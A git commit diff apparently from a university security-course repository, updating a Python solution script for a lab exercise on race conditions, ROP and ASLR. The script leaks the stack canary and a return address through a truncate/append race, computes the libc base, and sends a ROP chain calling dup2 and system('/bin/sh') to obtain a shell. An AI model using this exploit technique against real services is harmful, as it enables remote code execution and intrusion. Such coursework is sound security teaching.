24192835ab64ff51c6ff6c4279d40e55cb0e376d
vilskin <slavov.vili@gmail.com>
2024-01-11 15:55:52 +0100

    Sicherheit: add solution attempt for exercise 3 and update gitignore

--- Anwendungssicherheit/4_Race_conditions_nx_rop_aslr.md/Sheet/exercise3/solution.py
+++ Anwendungssicherheit/4_Race_conditions_nx_rop_aslr.md/Sheet/exercise3/solution.py
@@ -19,6 +19,7 @@ def delete_message(s):
     s.send(data.encode('ASCII'))
     data = MESSAGE_NAME + '\n'
     s.send(data.encode('ASCII'))
+    s.recv(1024)
 
 
 MAX_SIZE = 0x800
@@ -34,26 +35,28 @@ def uplink_message(s):
     s.send(data.encode('ASCII'))
     data = 'A' * MAX_SIZE + '\n'
     s.send(data.encode('ASCII'))
+    s.recv(1024)
 
 
 BUFFER_SIZE = 0x808
-TRUNCATE_SIZE = BUFFER_SIZE + 0x20 + 8
-TRUNCATE_SIZE += 0x58 + 8
-TRUNCATE_SIZE += 0x28 + 8
-TRUNCATE_SIZE += 0x18 + 8
-def truncate_to_main_return(s):
-    print('Truncating message to ' + str(TRUNCATE_SIZE))
+STACK_SIZE = BUFFER_SIZE + 0x20 + 8
+STACK_SIZE += 0x58 + 8
+STACK_SIZE += 0x28 + 8
+STACK_SIZE += 0x18 + 8
+def truncate_message(s, new_size):
+    print('Truncating message to ' + str(new_size))
     data = 'truncate_message\n'
     s.send(data.encode('ASCII'))
     data = SERVICE_NAME + '\n'
     s.send(data.encode('ASCII'))
     data = MESSAGE_NAME + '\n'
     s.send(data.encode('ASCII'))
-    data = str(TRUNCATE_SIZE) + '\n'
+    data = str(new_size) + '\n'
     s.send(data.encode('ASCII'))
+    s.recv(1024)
 
 
-def downlink_stack(s):
+def downlink_message(s, length):
     print('Fetching message: ' + MESSAGE_PATH)
     data = 'downlink_message\n'
     s.send(data.encode('ASCII'))
@@ -63,22 +66,37 @@ def downlink_stack(s):
     print(s.recv(1024).decode('UTF-8'))
     data = MESSAGE_NAME + '\n'
     s.send(data.encode('ASCII'))
+    s.recv(1024)
     time.sleep(1)
     data = s.recv(1024)
-    data += s.recv(TRUNCATE_SIZE)
+    data += s.recv(length)
     start = data.find(b'AAA')
     end = data.rfind(b'\n')
     return data[start:end]
 
 
+def append_to_message(s, append_data):
+    print('Appending message: ' + MESSAGE_PATH)
+    data = 'append_to_message\n'
+    s.send(data.encode('ASCII'))
+    data = SERVICE_NAME + '\n'
+    s.send(data.encode('ASCII'))
+    data = MESSAGE_NAME + '\n'
+    s.send(data.encode('ASCII'))
+    print('Appending ' + str(len(append_data)) + ' characters')
+    data = str(len(append_data)) + '\n'
+    s.send(data.encode('ASCII'))
+    input("Press ENTER after truncating...")
+    s.send(append_data + b'\n')
+    s.recv(1024)
 
-def my_interact(s):
-    # print('Attach in the next 5 seconds!')
-    # time.sleep(5)
+
+
+def get_stack(s):
     delete_message(s)
     uplink_message(s)
-    truncate_to_main_return(s)
-    return downlink_stack(s)
+    truncate_message(s, STACK_SIZE)
+    return downlink_message(s, STACK_SIZE)
 
 
 
@@ -88,7 +106,7 @@ t.sock = s
 
 
 
-stack = my_interact(s)
+stack = get_stack(s)
 print('Stack: ' + str(stack) + '\n')
 canary = stack[BUFFER_SIZE:BUFFER_SIZE+8]
 print('Canary: ' + str(canary) + '\n')
@@ -98,6 +116,7 @@ print('Main Return Address: ' + hex(main_return_addr) + '\n')
 
 
 libc_base = main_return_addr - 0x29d90
+print('libc base: ' + hex(libc_base) + '\n')
 pop_rdi = (libc_base + 0x2a3e5).to_bytes(8, 'little')
 pop_rsi = (libc_base + 0x2be51).to_bytes(8, 'little')
 dup2 = (libc_base + 0x115200).to_bytes(8, 'little')
@@ -138,11 +157,10 @@ rop_chain += bin_sh
 rop_chain += system
 
 
-# TODO: truncate back to max - append, start appending, truncate to buffer size, continue appending
-
-rop_chain += b'\n'
-
-s.send(rop_chain)
+TRUNCATE_SIZE = MAX_SIZE - len(rop_chain)
+truncate_message(s, TRUNCATE_SIZE)
+append_to_message(s, rop_chain)
+downlink_message(s, BUFFER_SIZE + len(rop_chain))
 
 
 
